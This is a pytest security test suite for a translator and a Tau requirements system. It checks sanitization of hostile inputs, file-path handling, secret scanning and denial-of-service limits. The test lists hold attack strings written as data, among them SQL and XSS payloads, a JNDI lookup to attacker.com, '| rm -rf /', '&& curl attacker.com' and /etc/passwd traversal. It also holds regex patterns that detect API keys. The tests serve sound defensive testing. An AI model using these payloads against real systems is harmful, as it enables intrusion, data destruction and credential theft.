#!/usr/bin/env python3
"""
Security Test Suite
==================

Tests for security vulnerabilities and attack vectors.
Following VibeArchitect security-first principles.
"""

import pytest
import re
from unittest.mock import Mock, patch
import tempfile
import os
from pathlib import Path
import json

# Add parent directory for imports
import sys
sys.path.insert(0, str(Path(__file__).parent.parent))

from translators.production_translator import ProductionTranslator


class TestInputValidation:
    """Test input validation and sanitization."""
    
    @pytest.fixture
    def translator(self):
        """Create translator instance for testing."""
        return ProductionTranslator()
    
    @pytest.mark.security
    def test_sql_injection_attempts(self, translator):
        """Test protection against SQL injection patterns."""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'/*",
            "1; EXEC sp_configure",
            "' UNION SELECT password FROM users--"
        ]
        
        for malicious_input in malicious_inputs:
            result = translator.translate(malicious_input, "tau_to_tce")
            
            # Should not contain dangerous SQL patterns
            assert "DROP" not in result["output"].upper()
            assert "EXEC" not in result["output"].upper()
            assert "UNION" not in result["output"].upper()
            assert "--" not in result["output"]
    
    @pytest.mark.security
    def test_script_injection_attempts(self, translator):
        """Test protection against script injection."""
        script_injections = [
            "<script>alert('xss')</script>",
            "javascript:alert(1)",
            "onload=alert(1)",
            "${jndi:ldap://attacker.com/}",
            "{{7*7}}",  # Template injection
            "<%=7*7%>",  # ASP injection
        ]
        
        for injection in script_injections:
            result = translator.translate(injection, "tau_to_tce")
            
            # Should not execute or return script content
            assert "<script>" not in result["output"]
            assert "javascript:" not in result["output"]
            assert "alert" not in result["output"]
            assert "jndi:" not in result["output"]
    
    @pytest.mark.security
    def test_path_traversal_attempts(self, translator):
        """Test protection against path traversal attacks."""
        path_traversals = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "file:///etc/passwd",
        ]
        
        for path in path_traversals:
            result = translator.translate(f"read from {path}", "tau_to_tce")
            
            # Should not contain actual file paths
            assert "/etc/passwd" not in result["output"]
            assert "windows\\system32" not in result["output"]
    
    @pytest.mark.security
    def test_command_injection_attempts(self, translator):
        """Test protection against command injection."""
        command_injections = [
            "; cat /etc/passwd",
            "| rm -rf /",
            "&& curl attacker.com",
            "`whoami`",
            "$(id)",
            "; shutdown -h now",
        ]
        
        for injection in command_injections:
            result = translator.translate(f"system command{injection}", "tau_to_tce")
            
            # Should not contain shell metacharacters or commands
            assert "cat " not in result["output"]
            assert "rm -rf" not in result["output"]
            assert "curl " not in result["output"]
            assert "whoami" not in result["output"]
            assert "shutdown" not in result["output"]
    
    @pytest.mark.security
    def test_oversized_input_protection(self, translator):
        """Test protection against buffer overflow/DoS via large inputs."""
        # Generate large input (10MB)
        large_input = "A" * (10 * 1024 * 1024)
        
        result = translator.translate(large_input, "tau_to_tce")
        
        # Should handle gracefully without crashing
        assert result["success"] is not None
        # Output should be truncated or error message
        assert len(result["output"]) < len(large_input)


class TestFileSystemSecurity:
    """Test file system access security."""
    
    @pytest.mark.security
    def test_no_arbitrary_file_write(self):
        """Test that system doesn't write to arbitrary locations."""
        from utilities.requirements_to_tau_system import RequirementsToTauSystem
        
        # Try to trick system into writing to sensitive location
        malicious_session_dir = Path("/etc")
        
        with pytest.raises((PermissionError, OSError)):
            # Should fail to create session in protected directory
            system = RequirementsToTauSystem(
                save_sessions=True,
                session_dir=malicious_session_dir
            )
    
    @pytest.mark.security  
    def test_file_path_sanitization(self):
        """Test that file paths are properly sanitized."""
        from utilities.requirements_to_tau_system import RequirementsToTauSystem
        
        with tempfile.TemporaryDirectory() as temp_dir:
            system = RequirementsToTauSystem(
                save_sessions=True,
                session_dir=Path(temp_dir)
            )
            
            # Attempt path traversal in session ID
            malicious_id = "../../../etc/passwd"
            
            # System should sanitize the session ID
            session_file = system.session_dir / f"session_{malicious_id}.json"
            
            # Should not create file outside temp directory
            assert not str(session_file).startswith("/etc/")


class TestCryptographySecurity:
    """Test cryptographic implementations."""
    
    @pytest.mark.security
    def test_no_hardcoded_secrets(self):
        """Test that no secrets are hardcoded in source."""
        # Scan production files for potential secrets
        source_files = [
            "translators/production_translator.py",
            "translators/refactored_llm_translator.py", 
            "utilities/requirements_to_tau_system.py"
        ]
        
        secret_patterns = [
            r'(?i)(password|passwd|pwd)\s*[:=]\s*["\'][\w\d!@#$%^&*()_+=-]+["\']',
            r'(?i)(api[_-]?key|apikey)\s*[:=]\s*["\'][\w\d-]+["\']',
            r'(?i)(secret|token)\s*[:=]\s*["\'][\w\d\-_=]+["\']',
            r'sk-[a-zA-Z0-9]{48}',  # OpenAI API key pattern
            r'sk-ant-[a-zA-Z0-9]{48}',  # Anthropic API key pattern
        ]
        
        for file_path in source_files:
            full_path = Path(__file__).parent.parent / file_path
            if full_path.exists():
                content = full_path.read_text()
                
                for pattern in secret_patterns:
                    matches = re.findall(pattern, content)
                    # Filter out obvious examples/placeholders
                    real_secrets = [m for m in matches if 
                                  not any(placeholder in str(m).lower() 
                                        for placeholder in ['example', 'placeholder', 'your-', 'change-this'])]
                    
                    assert len(real_secrets) == 0, f"Potential hardcoded secret found in {file_path}: {real_secrets}"


class TestAuthenticationSecurity:
    """Test authentication and authorization mechanisms."""
    
    @pytest.mark.security
    def test_env_file_protection(self):
        """Test that .env files are properly protected."""
        env_file = Path(__file__).parent.parent / ".env"
        
        if env_file.exists():
            # Check file permissions
            stat = env_file.stat()
            permissions = oct(stat.st_mode)[-3:]
            
            # Should be readable only by owner (600 or 400)
            assert permissions in ['600', '400'], f".env file has insecure permissions: {permissions}"
    
    @pytest.mark.security
    def test_sensitive_data_not_logged(self, caplog):
        """Test that sensitive data is not logged."""
        from translators.production_translator import ProductionTranslator
        
        translator = ProductionTranslator()
        
        # Simulate request with sensitive data
        sensitive_input = "API key is sk-test123456789 and password is secretpass"
        
        result = translator.translate(sensitive_input, "tau_to_tce")
        
        # Check that sensitive patterns are not in logs
        log_output = caplog.text
        assert "sk-test123456789" not in log_output
        assert "secretpass" not in log_output


class TestDenialOfServiceProtection:
    """Test protection against DoS attacks."""
    
    @pytest.mark.security
    @pytest.mark.slow
    def test_recursive_pattern_protection(self):
        """Test protection against patterns that could cause infinite recursion."""
        from translators.refactored_llm_translator import TauPatternValidator
        
        validator = TauPatternValidator()
        
        # Patterns that could cause exponential backtracking
        dangerous_patterns = [
            "(" * 1000 + ")" * 1000,  # Deeply nested parentheses
            "a" * 10000 + "b",  # Long string with mismatch at end
            "(((((((((((" * 100,  # Unbalanced nested groups
        ]
        
        for pattern in dangerous_patterns:
            # Should complete within reasonable time
            import time
            start = time.time()
            
            result = validator.validate(pattern)
            
            elapsed = time.time() - start
            
            # Should not take more than 1 second
            assert elapsed < 1.0, f"Pattern took too long to validate: {elapsed:.2f}s"
            
            # Should detect the error
            assert not result.valid
    
    @pytest.mark.security
    def test_memory_usage_limits(self):
        """Test that translation doesn't consume excessive memory."""
        import psutil
        import os
        
        from translators.production_translator import ProductionTranslator
        
        translator = ProductionTranslator()
        
        # Measure memory before
        process = psutil.Process(os.getpid())
        memory_before = process.memory_info().rss / (1024 * 1024)  # MB
        
        # Process moderately large input
        large_input = "always temperature > 20 " * 1000
        
        result = translator.translate(large_input, "tau_to_tce")
        
        # Measure memory after
        memory_after = process.memory_info().rss / (1024 * 1024)  # MB
        memory_increase = memory_after - memory_before
        
        # Should not increase memory by more than 100MB
        assert memory_increase < 100, f"Memory increased by {memory_increase:.1f}MB"


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])